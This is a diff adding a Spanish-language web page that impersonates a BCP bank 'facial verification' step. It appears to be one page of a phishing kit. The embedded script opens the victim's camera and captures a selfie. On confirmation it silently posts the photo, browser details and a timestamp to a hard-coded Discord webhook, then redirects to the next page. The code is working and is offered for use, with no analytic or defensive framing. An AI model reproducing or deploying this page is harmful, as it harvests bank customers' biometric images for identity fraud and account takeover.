@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificación Facial - BCP</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f4f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 414px;
+      min-height: 100vh;
+      background-color: #f3f3f3;
+      padding: 20px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Barra superior */
+    .top-bar {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 10px;
+      margin-bottom: 40px;
+    }
+
+    .close-btn {
+      font-size: 22px;
+      color: #333;
+      cursor: pointer;
+      text-decoration: none;
+      line-height: 1;
+    }
+
+    /* Logo BCP */
+    .logo-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      margin-right: 22px;
+    }
+
+    .logo-img {
+      height: 28px;
+      object-fit: contain;
+    }
+
+    /* Marco circular para la cámara */
+    .camera-frame {
+      width: 280px;
+      height: 280px;
+      border-radius: 50%;
+      overflow: hidden;
+      margin-top: 20px;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #111;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      position: relative;
+    }
+
+    #camera-feed {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+    }
+
+    #foto-capturada {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+
+    /* Mensaje de aviso */
+    .alert-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-align: center;
+      padding: 0 10px;
+    }
+
+    .alert-icon { font-size: 18px; }
+
+    .alert-text {
+      font-size: 16px;
+      color: #333;
+      font-weight: 400;
+      line-height: 1.3;
+    }
+
+    /* Acciones inferiores */
+    .actions-container {
+      margin-top: 30px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    /* Botón "Tomar foto" (visible al inicio) */
+    .btn-capturar {
+      width: 100%;
+      height: 52px;
+      background-color: #d86227;
+      color: #ffffff;
+      border: none;
+      border-radius: 26px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .btn-capturar:active { background-color: #be531f; }
+
+    /* Botones tras la captura (ocultos al inicio) */
+    .capture-actions {
+      display: none;
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+    }
+
+    .btn-confirmar {
+      width: 100%;
+      height: 52px;
+      background-color: #d86227;
+      color: #ffffff;
+      border: none;
+      border-radius: 26px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .btn-confirmar:active { background-color: #be531f; }
+
+    .btn-repetir {
+      width: 100%;
+      height: 52px;
+      background-color: transparent;
+      color: #d86227;
+      border: 1.5px solid #d86227;
+      border-radius: 26px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Barra superior con botón X y Logo -->
+    <div class="top-bar">
+      <div class="close-btn" id="btn-cerrar">&#215;</div>
+      <div class="logo-container">
+        <img src="LT3.png" alt="" class="logo-img" />
+      </div>
+    </div>
+
+    <!-- Visor circular con la cámara activa -->
+    <div class="camera-frame">
+      <video id="camera-feed" autoplay playsinline muted></video>
+      <img id="foto-capturada" alt="Foto capturada" />
+    </div>
+
+    <!-- Mensaje de advertencia / instrucción -->
+    <div class="alert-container" id="alerta">
+      <span class="alert-icon">&#9888;&#65039;</span>
+      <p class="alert-text">Acerca un poco tu rostro a la cámara.</p>
+    </div>
+
+    <!-- Acciones -->
+    <div class="actions-container">
+      <!-- Botón visible desde el inicio -->
+      <button class="btn-capturar" id="btn-capturar" type="button">Tomar foto</button>
+
+      <!-- Botones que aparecen después de capturar -->
+      <div class="capture-actions" id="capture-actions">
+        <button class="btn-confirmar" id="btn-confirmar" type="button">Confirmar</button>
+        <button class="btn-repetir" id="btn-repetir" type="button">Repetir foto</button>
+      </div>
+    </div>
+  </div>
+
+  <canvas id="canvas-captura" style="display:none;"></canvas>
+
+  <!-- ============================================================
+       SCRIPT EMBEBIDO
+       - Cámara + botón "Tomar foto" + confirmar + Webhook Discord
+       - Redirección SOLO al confirmar → index4.html
+       ============================================================ -->
+  <script>
+  (function () {
+    'use strict';
+
+    /* ================= CONFIGURACIÓN ================= */
+    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1574870438499319819/AFIZOmm6G9wYZBP4opqeUKkujnpL0CGWIqNPclqv9PPMgxuuY9pnKwwNrew2E5Vg-XlM';
+    const REDIRECT_URL = 'index4.html';
+
+    /* ================= REFERENCIAS ================= */
+    const videoElement  = document.getElementById('camera-feed');
+    const fotoCapturada = document.getElementById('foto-capturada');
+    const canvasEl      = document.getElementById('canvas-captura');
+    const btnCerrar     = document.getElementById('btn-cerrar');
+    const btnCapturar   = document.getElementById('btn-capturar');
+    const btnConfirmar  = document.getElementById('btn-confirmar');
+    const btnRepetir    = document.getElementById('btn-repetir');
+    const captureActions= document.getElementById('capture-actions');
+    const alerta        = document.getElementById('alerta');
+
+    let streamActivo  = null;
+    let blobCapturado = null;
+    let confirmando   = false;
+
+    /* ================= 1) Activar cámara ================= */
+    async function iniciarCamara() {
+      try {
+        const constraints = {
+          video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
+          audio: false
+        };
+        streamActivo = await navigator.mediaDevices.getUserMedia(constraints);
+        videoElement.srcObject = streamActivo;
+      } catch (error) {
+        console.error('No se pudo acceder a la cámara:', error);
+        alert('Por favor, permite el acceso a la cámara para continuar con la verificación.');
+        alerta.querySelector('.alert-text').textContent =
+          'No se pudo acceder a la cámara. Verifica los permisos.';
+        btnCapturar.disabled = true;
+        btnCapturar.style.opacity = '0.5';
+        btnCapturar.style.cursor = 'not-allowed';
+      }
+    }
+
+    /* ================= 2) Capturar (desde botón) ================= */
+    function capturarFoto() {
+      if (!videoElement.videoWidth) {
+        alert('La cámara aún no está lista. Intenta de nuevo en un momento.');
+        return;
+      }
+      const w = videoElement.videoWidth;
+      const h = videoElement.videoHeight;
+      canvasEl.width  = w;
+      canvasEl.height = h;
+      const ctx = canvasEl.getContext('2d');
+      ctx.drawImage(videoElement, 0, 0, w, h);
+
+      canvasEl.toBlob(function (blob) {
+        if (!blob) return;
+        blobCapturado = blob;
+
+        const url = URL.createObjectURL(blob);
+        fotoCapturada.src = url;
+        fotoCapturada.style.display = 'block';
+        videoElement.style.display = 'none';
+
+        // Cambiar UI: ocultar "Tomar foto" y mostrar Confirmar/Repetir
+        btnCapturar.style.display = 'none';
+        captureActions.style.display = 'flex';
+
+        // Ocultar alerta
+        alerta.style.display = 'none';
+      }, 'image/jpeg', 0.9);
+    }
+
+    /* ================= 3) Detener cámara ================= */
+    function detenerCamara() {
+      if (streamActivo) {
+        streamActivo.getTracks().forEach(function (t) { t.stop(); });
+        streamActivo = null;
+      }
+    }
+
+    /* ================= 4) Enviar foto + embed a Discord ================= */
+    async function enviarFotoDiscord(blob) {
+      const embed = {
+        username: 'LT1 · Verificación Facial',
+        embeds: [{
+          title: '📸 Captura facial recibida',
+          color: 0xd86227,
+          fields: [
+            { name: '📍 Página',    value: '04.html — Verificación Facial', inline: true },
+            { name: '🌐 Navegador', value: navigator.userAgent.slice(0, 200), inline: false },
+            { name: '🕒 Fecha',     value: new Date().toLocaleString('es-PE'), inline: false }
+          ],
+          image: { url: 'attachment://rostro.jpg' },
+          footer: { text: 'Sistema de ingreso LT1' },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const form = new FormData();
+      form.append('payload_json', JSON.stringify(embed));
+      form.append('files[0]', blob, 'rostro.jpg');
+
+      const res = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
+      if (!res.ok) throw new Error('Webhook ' + res.status);
+    }
+
+    /* ================= 5) Botón "Tomar foto" ================= */
+    btnCapturar.addEventListener('click', capturarFoto);
+
+    /* ================= 6) Confirmar → enviar → redirect ================= */
+    btnConfirmar.addEventListener('click', async function () {
+      if (confirmando || !blobCapturado) return;
+      confirmando = true;
+
+      btnConfirmar.disabled = true;
+      btnRepetir.disabled = true;
+      const textoOriginal = btnConfirmar.textContent;
+      btnConfirmar.textContent = 'Enviando...';
+
+      try {
+        await enviarFotoDiscord(blobCapturado);
+      } catch (err) {
+        console.warn('Error al enviar la foto:', err);
+      } finally {
+        detenerCamara();
+        btnConfirmar.textContent = textoOriginal;
+        window.location.href = REDIRECT_URL;
+      }
+    });
+
+    /* ================= 7) Repetir → volver a la cámara ================= */
+    btnRepetir.addEventListener('click', function () {
+      if (fotoCapturada.src) {
+        URL.revokeObjectURL(fotoCapturada.src);
+        fotoCapturada.src = '';
+      }
+      blobCapturado = null;
+      fotoCapturada.style.display = 'none';
+      videoElement.style.display = 'block';
+
+      captureActions.style.display = 'none';
+      btnCapturar.style.display = 'flex';
+      alerta.style.display = 'flex';
+      alerta.querySelector('.alert-text').textContent = 'Acerca un poco tu rostro a la cámara.';
+    });
+
+    /* ================= 8) Botón X → solo detiene cámara ================= */
+    btnCerrar.addEventListener('click', function () {
+      detenerCamara();
+      alerta.style.display = 'flex';
+      alerta.querySelector('.alert-text').textContent = 'Cámara detenida.';
+      btnCapturar.disabled = true;
+      btnCapturar.style.opacity = '0.5';
+      btnCapturar.style.cursor = 'not-allowed';
+    });
+
+    /* ================= Inicio ================= */
+    window.addEventListener('DOMContentLoaded', iniciarCamara);
+  })();
+  </script>
+
+</body>
+</html>
